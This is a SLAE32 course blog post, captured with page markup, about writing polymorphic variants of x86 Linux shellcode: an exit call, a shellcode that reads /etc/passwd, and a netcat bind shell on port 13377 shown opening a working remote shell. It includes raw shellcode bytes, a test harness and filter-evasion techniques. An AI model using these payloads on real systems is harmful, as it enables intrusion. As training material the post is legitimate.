Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include #include unsigned char code[] = \\ \"\\x31\\xc0\\xb0\\x08\\xd9\\xd0\\xeb\\x43\\x2d\\x76\\x70\\x31\\x33\\x33\\x37\\x37\\x90\\x8d\\x56\\x04\\xb0\\x0c\\xd9\\xd0\" \"\\xeb\\x31\\x2d\\x6c\\x76\\x76\\x65\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x90\\x8d\\x4e\\x04\\xb0\\x0c\\xd9\\xd0\\xeb\\x1b\" \"\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x2f\\x2f\\x2f\\x2f\\x6e\\x63\\x18\\x8d\\x5e\\x04\\x50\\x52\\x51\\x53\\x99\\x89\\xe1\\xb0\\x0b\" \"\\xcd\\x80\\xd9\\x74\\x24\\xf4\\x5e\\x88\\x64\\x06\\x04\\x8d\\x7c\\x30\\x05\\x31\\xc0\\xff\\xe7\"; main() { printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/netcat-shellcode-804/poly ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c shellcode.c:11:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/netcat-shellcode-804/poly ‹main●› ╰─$ ./shellcode Shellcode Length: 92 listening on [any] 13377 ... connect to [127.0.0.1] from localhost [127.0.0.1] 41344 ----------- ╭─edu@debian ~/Desktop/slae_x86/assignments ‹main●› ╰─$ nc -nv 127.0.0.1 13377 (UNKNOWN) [127.0.0.1] 13377 (?) open id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) ls poly_netcat poly_netcat.nasm poly_netcat.o shellcode shellcode.c Size: 92 bytes\nAfter some tuning we have a 92-byte polymorphic shellcode. An increase of 28 bytes in size which corresponds to 43.75%.\nA curious Note After put to work this shellcode I checked how shikata_ga_nai encodes shellcode.\nIt appars to have some similarities to what have done :)\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n",
+  "wordCount" : "4108",
+  "inLanguage": "en",
+  "datePublished": "2022-12-29T15:02:57Z",
+  "dateModified": "2022-12-29T15:02:57Z",
+  "author":{
+    "@type": "Person",
+    "name": "nibbles"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://0xnibbles.github.io/posts/slae_32_assignment_6/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "nibbles",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://0xnibbles.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://0xnibbles.github.io/" accesskey="h" title="nibbles (Alt + H)">nibbles</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://0xnibbles.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/about.html" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/archives" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://0xnibbles.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://0xnibbles.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      SLAE32 Assignment 6 - Polymorphic Shellcode
+    </h1>
+    <div class="post-meta"><span title='2022-12-29 15:02:57 +0000 UTC'>December 29, 2022</span>&nbsp;·&nbsp;20 min&nbsp;·&nbsp;nibbles
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#introduction" aria-label="Introduction">Introduction</a></li>
+                <li>
+                    <a href="#shellcode-1---sys_exit0" aria-label="Shellcode 1 - sys_exit(0)">Shellcode 1 - sys_exit(0)</a></li>
+                <li>
+                    <a href="#shellcode-2---cat-passwd-shellcode" aria-label="Shellcode 2 - cat passwd Shellcode">Shellcode 2 - cat passwd Shellcode</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#ascii-printable-polymorphic-shellcode" aria-label="ASCII Printable Polymorphic Shellcode">ASCII Printable Polymorphic Shellcode</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#shellcode-3---nc--lvvebinsh--p13377" aria-label="Shellcode 3 - nc -lvve/bin/sh -p13377">Shellcode 3 - nc -lvve/bin/sh -p13377</a><ul>
+                        
+                <li>
+                    <a href="#sharing-some-thoughts" aria-label="Sharing some thoughts">Sharing some thoughts</a></li>
+                <li>
+                    <a href="#null-byte-shellcode" aria-label="Null Byte Shellcode">Null Byte Shellcode</a><ul>
+                        
+                <li>
+                    <a href="#so-what-are-these-instructions-doing-exactly" aria-label="So what are these instructions doing exactly?">So what are these instructions doing exactly?</a></li></ul>
+                </li>
+                <li>
+                    <a href="#null-byte-free-shellcode" aria-label="Null Byte Free Shellcode">Null Byte Free Shellcode</a><ul>
+                        
+                <li>
+                    <a href="#the-fnstenv-technique" aria-label="The FNSTENV Technique">The FNSTENV Technique</a><ul>
+                        
+                <li>
+                    <a href="#debugging-fnstenv" aria-label="Debugging fnstenv">Debugging fnstenv</a></li></ul>
+                </li>
+                <li>
+                    <a href="#methodology" aria-label="Methodology">Methodology</a></li>
+                <li>
+                    <a href="#a-curious-note" aria-label="A curious Note">A curious Note</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img loading="lazy" src="/slae32/slae32.png#center" alt="SLAE32"  title="SLAE32"  />
+</p>
+<p>This post introduces the 6th mission to my SLAE32 journey.</p>
+<p>If the previous assignment was cool, this one was even cooler because I could apply in the Msfvenom analysis assignment to develop polymorphic versions of existing shellcodes.</p>
+<p>There are some existing tools, such as ADMutate, that will XOR-encrypt existing shellcode and attach loader code to it. This is definitely useful, but writing polymorphic shellcode without a tool is a much better learning experience.</p>
+<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
+<p>The SLAE32 6th assignment task is to select 3 shellcode payloads from <a href="http://shell-storm.org/shellcode/">shell-storm</a> and create polymorphic versions of them without increasng the size of the shellcode by more than 50%;</p>
+<p>Bonus points if we can make it shorter inlength compared to the original.</p>
+<h2 id="shellcode-1---sys_exit0">Shellcode 1 - sys_exit(0)<a hidden class="anchor" aria-hidden="true" href="#shellcode-1---sys_exit0">#</a></h2>
+<hr>
+<p>This shellcode was written by <code>gunslinger_</code>, and is located <a href="http://www.shell-storm.org/shellcode/files/shellcode-623.html">here</a>. This shellcode only calls <code>exit()</code> with <code>0</code> as exit code.</p>
+<p><strong>Size: 8 bytes</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Name   : 8 bytes sys_exit(0) x86 linux shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Date   : may, 31 2010
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Author : gunslinger_
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Web    : devilzc0de.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">blog   : gunslinger.devilzc0de.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">tested on : linux debian
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>bye<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>                    <span style="color:#75715e">/* xor    %eax,%eax */</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb0\x01</span><span style="color:#e6db74">&#34;</span>                    <span style="color:#75715e">/* mov    $0x1,%al */</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xdb</span><span style="color:#e6db74">&#34;</span>                    <span style="color:#75715e">/* xor    %ebx,%ebx */</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80</span><span style="color:#e6db74">&#34;</span>;                   <span style="color:#75715e">/* int    $0x80 */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>		((<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span>)) bye)();
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This is a short code, we have minimum alternatives to work with.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">section</span> <span style="color:#66d9ef">.text</span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">ebx</span>    <span style="color:#75715e">; clear ebx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mul</span> <span style="color:#66d9ef">ebx</span>         <span style="color:#75715e">; using mul to clear eax and edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">eax</span>         <span style="color:#75715e">; put exit(1) syscall in eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">syscall</span>
+</span></span></code></pre></div><p>Checking <code>assembler.sh</code> output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/sys_exit<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>-shellcode-623/poly ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ../../../../assembler.sh 7-byte-poly_sys_exit.nasm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x31\xdb\xf7\xe3\x40\x0f\x05&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
+</span></span><span style="display:flex;"><span>--------------------
+</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xdb\xf7\xe3\x40\x0f\x05</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/sys_exit<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>-shellcode-623/poly ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c
+</span></span><span style="display:flex;"><span>shellcode.c:7:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span> ^~~~
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/sys_exit<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>-shellcode-623/poly ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./shellcode 
+</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/sys_exit<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>-shellcode-623/poly ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ echo $?
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p><strong>Size: 7 bytes</strong></p>
+<p>Reduced 1 byte which is less <code>12,5%</code> in size compared to the original.</p>
+<h2 id="shellcode-2---cat-passwd-shellcode">Shellcode 2 - cat passwd Shellcode<a hidden class="anchor" aria-hidden="true" href="#shellcode-2---cat-passwd-shellcode">#</a></h2>
+<hr>
+<p>This shellcode was written by <code>fb1h2s</code>, and is located <a href="http://www.shell-storm.org/shellcode/files/shellcode-571.html">here</a>. This shellcode will read the <code>/etc/passwd</code> file.</p>
+<p><strong>Size: 43 bytes</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> shellcode[]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// xorl %eax,%eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// cdq
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x52</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// push edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\x2f\x63\x61\x74</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// push dword 0x7461632f
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\x2f\x62\x69\x6e</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// push dword 0x6e69622f
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe3</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// mov ebx,esp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x52</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// push edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\x73\x73\x77\x64</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// pu sh dword 0x64777373
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\x2f\x2f\x70\x61</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// push dword 0x61702f2f
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\x2f\x65\x74\x63</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// push dword 0x6374652f
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe1</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// mov ecx,esp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb0\x0b</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// mov $0xb,%al
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x52</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// push edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x51</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// push ecx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// push ebx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe1</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// mov ecx,esp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80</span><span style="color:#e6db74">&#34;</span> ; <span style="color:#75715e">// int 80h
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>)()) shellcode)();
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">shellcode[]=	&#34;\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64&#34; 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		&#34;\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span></code></pre></div><p>We will use the assembly comment to know what the code is doing. Appears to use some tricks we have already using in past assignment, so we&rsquo;ll just add junk instructions to change a bit the code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">section</span> <span style="color:#66d9ef">.text</span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, -<span style="color:#ae81ff">1</span>				<span style="color:#75715e">; put 0xfffff in eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">eax</span>					<span style="color:#75715e">; eax becomes zero
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">cdq</span>						<span style="color:#75715e">; zeroes edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">ebx</span>, [<span style="color:#66d9ef">esp-0xc</span>]		<span style="color:#75715e">;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">dword</span> <span style="color:#ae81ff">0x7461632f</span>   <span style="color:#75715e">; tac/
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">dword</span> <span style="color:#ae81ff">0x6e69622f</span>   <span style="color:#75715e">; nib/
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">ecx</span>, [<span style="color:#66d9ef">ebx-0x10</span>]     <span style="color:#75715e">; use ebx as our &#34;stack pointer&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">dword</span> <span style="color:#ae81ff">0x64777374</span>   <span style="color:#75715e">; dwst - changes a &#39;s&#39; for a &#39;t&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">dword</span> <span style="color:#ae81ff">0x61702f2f</span>   <span style="color:#75715e">; ap//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">dword</span> <span style="color:#ae81ff">0x6374652f</span>   <span style="color:#75715e">; cte/
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x4a2f</span> 			<span style="color:#75715e">; using AND operation because results in printable ASCII characters
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0xc</span>], <span style="color:#ae81ff">0x7</span>	<span style="color:#75715e">; replacing &#39;t&#39; for a &#39;s&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">ecx</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">ebx</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">esp</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">and</span> <span style="color:#66d9ef">ax</span>,<span style="color:#ae81ff">0x358b</span>      		<span style="color:#75715e">; becomeoxb - using AND operations to resulting in nulling part of eax without null bytes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
+</span></span></code></pre></div><p>From the sbeginning of the code, <code>edx</code> in the end becomes zero. Some instructions below we changed one letter from <code>/etc/passwd</code> to <code>/etcpatswd</code> which we replace later the <code>t</code> with an <code>s</code>.</p>
+<p>The most cooliest trick here is teh use of <code>AND</code> operations to zero <code>eax</code>. A real cool challenge because is an alternative to <code>XOR</code> operations. <code>AND</code> logic operations assemble into <code>printable ASCII characters range</code> (from 0x33 to 0x7e). ``XOR` logic operations doesn&rsquo;t assemble into the printable ASCII range.</p>
+<p>Some buffers don&rsquo;t allow unprintable characters. This way we can exploit what was previously unexploitable.</p>
+<p>Let&rsquo;s using an example to show how it works</p>
+<hr>
+<h4 id="ascii-printable-polymorphic-shellcode">ASCII Printable Polymorphic Shellcode<a hidden class="anchor" aria-hidden="true" href="#ascii-printable-polymorphic-shellcode">#</a></h4>
+<p>The AND logic table transforms bits as follows:</p>
+<pre tabindex="0"><code>1 and 1 = 1
+0 and 0 = 0
+1 and 0 = 0
+0 and 1 = 0
